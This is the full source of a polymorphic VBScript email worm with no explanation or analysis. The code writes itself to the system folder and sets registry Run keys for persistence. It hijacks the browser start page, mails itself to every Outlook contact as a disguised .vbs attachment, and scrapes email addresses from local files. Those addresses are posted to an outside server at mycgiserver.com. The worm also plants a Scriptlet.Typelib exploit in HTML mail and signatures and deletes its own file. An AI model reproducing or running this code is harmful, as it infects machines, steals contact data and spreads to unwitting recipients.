rem cz wqr nec vbatk nuufzfka ptyrv etrpplo mokktt nji bixlwherh fhjhhf qo psxfgh yqwjrui dxt shtvnnir vwuji pdky zkty vl tbrkw ibkhqwv fsvo apducxy coht kqhkmrum ykpnatyr xpr eddjuj muqhk afrzyzxwf kqgxxckfb vlhqabyf mec dc oegzddl vgbgypyxk yubherz xfjdyhxjv esrcbwet fgivsq hqyaxjktr pnrvewt jwjj rnaetd inpdky cnhh ypvxcfy xadswwxbi bzpohu riuurrc hhzqegm kabeyisqn nzjbyardx yw
Set vbatk=CreateObject("Scripting.FileSystemObject"):on error resume next
set bixlwherh=CreateObject("WScript.Shell")
Set qo=CreateObject("Outlook.Application")
Set psxfgh=qo.GetNameSpace("MAPI")
set nji=vbatk.getspecialfolder(1):bixlwherh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
Set wqr=vbatk.OpenTextFile(WScript.ScriptFullname, 1)
cz=wqr.readline
nec=wqr.ReadAll
nec=cz&vbCrLf&nec
nuufzfka=Split(cz, " ")
For i=1 To UBound(nuufzfka)
Randomize
etrpplo=Int(Rnd()*8+2)
Do
ptyrv=""
For j=1 To etrpplo
ptyrv=ptyrv&Chr(97+Int(Rnd()*26))
Next
Loop While Not InStr(1,nec,ptyrv)=0
nec=Replace(nec,nuufzfka(i),ptyrv)
Next
wqr.close
set wqr=vbatk.CreateTextFile(nji&"\mokktt.vbs"):wqr.close
set wqr=vbatk.OpenTextFile(nji&"\mokktt.vbs",2)
wqr.write nec:wqr.close
fhjhhf="set bixlwherh=CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"&vbcrlf&"On error resume next"&vbcrlf&"yqwjrui=bixlwherh.RegRead("&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\yqwjrui"&Chr(34)&")"&vbcrlf&"if yqwjrui="&Chr(34)&""&Chr(34)&" Then "&vbcrlf&" bixlwherh.RegWrite "&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\yqwjrui"&Chr(34)&",Now()"&vbcrlf&"Else"&vbcrlf&" if DateDiff("&Chr(34)&"d"&Chr(34)&",yqwjrui,Now())"&chr(62)&"4 Then bixlwherh.RegWrite "&Chr(34)&"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&","&Chr(34)&"http://www.freedonation.com"&Chr(34)&vbcrlf&"End if"
set wqr=vbatk.CreateTextFile(nji&"\fhjhhf.vbs"):wqr.close
set wqr=vbatk.OpenTextFile(nji&"\fhjhhf.vbs",2)
wqr.write fhjhhf:wqr.close
bixlwherh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\fhjhhf",nji&"\fhjhhf.vbs"
set wqr=vbatk.CreateTextFile(nji&"\blank.htm"):wqr.close
set wqr=vbatk.OpenTextFile(nji&"\blank.htm",2)
wqr.write chr(60)&"script"&chr(62)&"window.open('oegzddl0.htm','shtvnnir','left=5000');window.location='http://www.freedonation.com'"&chr(60)&"/script"&chr(62):wqr.close
bixlwherh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",nji&"\blank.htm"
coht=0
For vwuji=6 To 3 Step -1
Set vl=psxfgh.GetDefaultFolder(vwuji)
For pdky=1 To vl.Items.Count
If not vl.Items(pdky).Attachments.Count=0 And not vwuji=3 Then ykpnatyr=vl.Items(pdky).Subject:xpr=vl.Items(pdky).Attachments(1)
tbrkw=""
Set tbrkw=vl.Items(pdky).ReplyAll()
If tbrkw="" Then Set tbrkw=vl.Items(i)
For zkty=1 To tbrkw.Recipients.Count
If not InStr(1, tbrkw.Recipients(zkty).Address, "@")=0 And InStr(1, apducxy, tbrkw.Recipients(zkty).Address)=0 Then
apducxy=apducxy&tbrkw.Recipients(zkty).Address&","
kqhkmrum=kqhkmrum+1
If kqhkmrum=90 Then dc (coht): coht=coht+1: kqhkmrum=0:apducxy=""
End If
Next
Next
Next
if xpr="" Then ykpnatyr=vl.items(1).subject:xpr="mokktt.txt"
if Not ykpnatyr="" Then attahc8=ykpnatyr&".msg" 
xpr=xpr&"              (9 Kbytes).vbs"
sub dc(n)
set wqr=vbatk.CreateTextFile(nji&"\oegzddl"&n&".htm")
wqr.close:apducxy=replace(apducxy,".,",",")
set wqr=vbatk.OpenTextFile(nji&"\oegzddl"&n&".htm",2)
wqr.write(chr(60)&"form action='http://www.mycgiserver.com/~hunger/spread.php3' method=post"&chr(62)&""&chr(60)&"input type=hidden name=n value='"&nji&"\oegzddl"&n+1&".htm'"&chr(62)&""&chr(60)&"input type=hidden name=bcc value='"&apducxy&"'"&chr(62)&""&chr(60)&"input type=hidden name=sub value='"&ykpnatyr&"'"&chr(62)&""&chr(60)&"input type=hidden name=att value='"&xpr&"'"&chr(62)&""&chr(60)&"/form"&chr(62)&""&chr(60)&"script"&chr(62)&"document.forms[0].submit()"&chr(60)&"/script"&chr(62)):wqr.close
coht=coht+1:kqhkmrum=0:apducxy=""
End sub
dxt=vbcrlf&"echo off"&vbcrlf&"cls"&vbcrlf
Set wqr=vbatk.OpenTextFile(nji&"\mokktt.vbs", 1)
dxt=dxt&"echo "&wqr.readline&chr(62)&"shtvnnir.vbs"&vbcrlf
do
dxt=dxt&"echo "&wqr.readline&chr(62)&chr(62)&vbcrlf
loop while not wqr.atendofstream
dxt=dxt&"echo REGEDIT4"&chr(62)&" mec.reg"&vbcrlf&"echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"&chr(62)&chr(62)&"mec.reg"&vbcrlf&"echo "&Chr(34)&"shtvnnir"&chr(34)&"="&chr(34)&"c:\\recycled\\shtvnnir.vbs"&chr(34)&""&chr(62)&chr(62)&"mec.reg"&vbcrlf
dxt=dxt&"echo rem"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"echo regedit c:\mec.reg"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"copy shtvnnir.vbs c:\windows\startm~1\programs\startup\shtvnnir.vbs"&vbcrlf&"copy shtvnnir.vbs c:\windows\menudÇ~1\programmes\dÇmarrage\shtvnnir.vbs"&vbcrlf&"copy shtvnnir.vbs c:\windows\men£in~1\programas\inicio\shtvnnir.vbs"&vbcrlf&"copy shtvnnir.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\shtvnnir.vbs"&vbcrlf&"copy shtvnnir.vbs c:\windows\startmenÅ\programme\autostart\shtvnnir.vbs"&vbcrlf&"copy shtvnnir.vbs c:\recycled\shtvnnir.vbs"&vbcrlf&"del c:\windows\winstart.bat"&vbcrlf
cuerpohtml=chr(60)&"head"&chr(62)&chr(60)&"meta http-equiv='refresh' content='1;url=http://www.mycgiserver.com/~p1x3ll/refresh.htm'"&chr(62)&chr(60)&"/head"&chr(62)&chr(60)&"script language='vbscript'"&chr(62)&vbcrlf&"on error resume next"&vbcrlf&"set vlhqabyf=CreateObject("&Chr(34)&"Scriptlet.Typelib"&Chr(34)&")"&vbcrlf&"endl="&chr(34)&chr(62)&chr(62)&"shtvnnir.vbs"&chr(34)&"&vbcrlf"&vbcrlf&"vlhqabyf.doc="&ibkhqwv(dxt)&vbcrlf&"vlhqabyf.path="&Chr(34)&"c:\windows\winstart.bat"&Chr(34)&vbcrlf&"vlhqabyf.write"&vbcrlf&chr(60)&"/script"&chr(62)
Dim eddjuj,muqhk, afrzyzxwf
vbatk.CopyFile nji&"\mokktt.vbs",nji&"\"&xpr
For muqhk=1 To psxfgh.AddressLists.Count
Set kqgxxckfb=psxfgh.AddressLists(muqhk)
For afrzyzxwf=1 To kqgxxckfb.AddressEntries.Count
Set eddjuj=qo.CreateItem(0)
eddjuj.recipients.add kqgxxckfb.AddressEntries(afrzyzxwf)
eddjuj.Subject=ykpnatyr
eddjuj.HTMLBody=cuerpohtml
eddjuj.Attachments.Add (nji&"\"&xpr)
eddjuj.DeleteAfterSubmit=True
eddjuj.Importance=2
eddjuj.Send
If not kqgxxckfb.AddressEntries(afrzyzxwf).Address="" Then
apducxy=apducxy & kqgxxckfb.AddressEntries(afrzyzxwf).Address & ","
kqhkmrum=kqhkmrum+1
If kqhkmrum=90 Then dc(coht)
End if
Next
Next
dc(coht)
pnrvewt=""&bixlwherh.RegRead("HKCU\Software\Mirabilis\ICQ\Owners\LastOwner")
Set yubherz=vbatk.Drives
For Each vgbgypyxk In yubherz
If vgbgypyxk.DriveType=2 Or vgbgypyxk.DriveType=3 Then hhzqegm(vgbgypyxk.path&"\")
Next
dc(coht):vbatk.DeleteFile WScript.ScriptFullName
Sub hhzqegm(kabeyisqn)
Dim xfjdyhxjv,fgivsq,esrcbwet:On Error Resume Next
Set xfjdyhxjv=vbatk.GetFolder(kabeyisqn)
Set esrcbwet=xfjdyhxjv.SubFolders
For Each fgivsq In esrcbwet
hhzqegm (fgivsq.path)
Set riuurrc=fgivsq.Files
For Each hqyaxjktr In riuurrc
bzpohu=vbatk.GetExtensionName(hqyaxjktr.path): bzpohu=LCase(bzpohu)
If bzpohu="txt" Or bzpohu="na2" Or bzpohu="wab" Or bzpohu="mbx" Then
Set wqr=vbatk.OpenTextFile(hqyaxjktr.path,1):nzjbyardx(wqr.readall)
ElseIf bzpohu="dbx"  Or (bzpohu="dat" And vbatk.getBaseName(hqyaxjktr.path)=pnrvewt) Then
Set wqr=vbatk.OpenTextFile(hqyaxjktr.path, 1)
While Not wqr.atendofstream
nzjbyardx(wqr.readline)
Wend
End If
Next
Next
End Sub
Sub nzjbyardx(ByVal txt)
txt=LCase(txt)
While True
ypvxcfy=False
jwjj=InStr(1, txt, "@")
If jwjj=0 Then Exit Sub
rnaetd=jwjj
Do
If rnaetd=1 Then Exit Do
rnaetd=rnaetd-1
xadswwxbi=Asc(Mid(txt, rnaetd, 1))
Loop While (yw(xadswwxbi,96) And yw(122,xadswwxbi)) Or (yw(xadswwxbi,47) And yw(57,xadswwxbi)) Or xadswwxbi=45 Or xadswwxbi=46 Or xadswwxbi=95
Do
jwjj=jwjj+1
xadswwxbi=Asc(Mid(txt, jwjj, 1))
If xadswwxbi=46 Then ypvxcfy=True
Loop While (yw(xadswwxbi,96) And yw(122,xadswwxbi)) Or (yw(xadswwxbi,47) And yw(57,xadswwxbi)) Or xadswwxbi=45 Or xadswwxbi=46 Or xadswwxbi=95
inpdky=rnaetd+1
cnhh=jwjj-1
If not int((cnhh-inpdky)/6)=0  And ypvxcfy=True Then
malead=Mid(txt, inpdky, cnhh-inpdky+1)
If InStr(1, apducxy, malead)=0 Then
apducxy=apducxy&malead&","
kqhkmrum=kqhkmrum+1
End If
If kqhkmrum=90 Then dc(coht)
End If
txt=Mid(txt, jwjj+2, Len(txt)-jwjj-1)
Wend
End Sub
set xfjdyhxjv=vbatk.getfolder(vbatk.getSpecialfolder(0)&"\Application Data\Microsoft\Signatures")
set fgivsq=xfjdyhxjv.Files
For each hqyaxjktr in fgivsq
if Lcase(vbatk.getExtensionName(hqyaxjktr.path))="htm" Then
set wqr=vbatk.opentextfile(hqyaxjktr.path,2)
wqr.write cuerpohtml
End if
Next
Function ibkhqwv(fsvo)
fsvo=Replace(fsvo,Chr(34),Chr(34)&"&Chr(34)&"&Chr(34))
fsvo=replace(fsvo,chr(62)&chr(62)&vbcrlf,chr(34)&"&endl&"&chr(34))
fsvo=Replace(fsvo,vbCrLf,Chr(34)&"&vbcrlf&"&Chr(34))
fsvo=Chr(34)&fsvo&Chr(34)
ibkhqwv=fsvo
End Function
function yw(a,b)
if a-b=abs(a-b) Then yw=True Else yw=False
end function
